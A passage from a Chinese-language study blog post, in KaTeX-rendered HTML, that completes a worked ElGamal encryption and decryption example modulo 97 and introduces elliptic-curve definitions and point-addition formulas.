style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">0</span></span></span></span>（同样平方乘</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><msup><mi>β</mi><mi>k</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn><mo>∗</mo><mn>4</mn><msup><mn>4</mn><mn>36</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>31</mn></mrow><annotation encoding="application/x-tex">c_2=m\beta^k(mod\ p)=3*44^{36}(mod\ 97)=31</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span></span></span></span></p><p>这里经过老杜的指点，不必完全利用平方乘算法来计算，那样计算量太大了。因为如果有是1还要乘44，平方以后再乘44让人受不了，这时候还是之前手工算的时候更灵活，先算平方，再算四次方…$</p></li><li><p>解密 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mi>a</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>31</mn><mo>∗</mo><mo stretchy="false">(</mo><mn>5</mn><msup><mn>0</mn><mn>58</mn></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m=c_2*((c_1)^a)^{-1}(mod\ p)=31*(50^{58})^{-1}(mod\ 97)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>5</mn><msup><mn>0</mn><mn>58</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">50^{58}(mod\ 97)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span></span></span></span>认真算一下，发现4次方是-1,之后的八次方，十六次方，以及三十二次方都是1，故最后的结果是75。</p><p>75的逆为22，故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mn>31</mn><mo>∗</mo><mn>22</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">m=31*22(mod\ 97)=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>。成功解密得到了明文。</p></li></ol><p><img src="https://upyun.wuuconix.link/image-20211017223536351.png" alt="Elgmal example" /></p><h2 id="elliptic-curve"><a class="markdownIt-Anchor" href="#elliptic-curve"></a> Elliptic Curve</h2><p>椭圆曲线密码与Elgmal极为类似，可以对照记忆。</p><h3 id="椭圆曲线定义"><a class="markdownIt-Anchor" href="#椭圆曲线定义"></a> 椭圆曲线定义</h3><p>椭圆曲线是满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mtext>   </mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">y^2=x^3+ax+b \ \ \ a,b\in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>的所有解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>R</mi><mo>×</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">(x,y)\in R\times R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>，加上一个无穷远点O。</p><h3 id="椭圆曲线上的加法"><a class="markdownIt-Anchor" href="#椭圆曲线上的加法"></a> 椭圆曲线上的加法</h3><p>这个椭圆曲线上的加法十分重要，必须要背出来，之后的加密需要用到。</p><p><img src="https://upyun.wuuconix.link/image-20211017223504313.png" alt="ecc add" /></p><p><img src="https://upyun.wuuconix.link/image-20211017223620429.png" alt="ecc add 2" /></p><p>当两个点关于x轴对称的话，那么他们相加为O。一个点加上一个O，还是本身。</p><p>如果那么普通的两个点P(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>P</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>P</mi></msub></mrow><annotation encoding="application/x-tex">x_P,y_P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)与Q(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>Q</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>Q</mi></msub></mrow><annotation encoding="application/x-tex">x_Q,y_Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>)，假设它们相加为R点（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">x_R,y_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）的话。</p><p>我们首先需要算一个神秘的值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>。这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>需要分两种情况讨论。如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>不是同一个点，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>就是就是两点的斜率。如果P和Q是同一个点，那么这时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn><mi>y</mi></mrow><annotation encoding="application/x-tex">\alpha = (3x^2+a)/2y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>，这里实际上不用区分<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">x_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>还是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>P</mi></msub></mrow><annotation encoding="application/x-tex">x_P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>了，因为两者的坐标相同。</p><p>然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mi>α</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>Q</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x_R=\alpha^2-x_P-x_Q\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mi>α</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>R</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>P</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y_R=\alpha(x_P-x_R)-y_P\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" 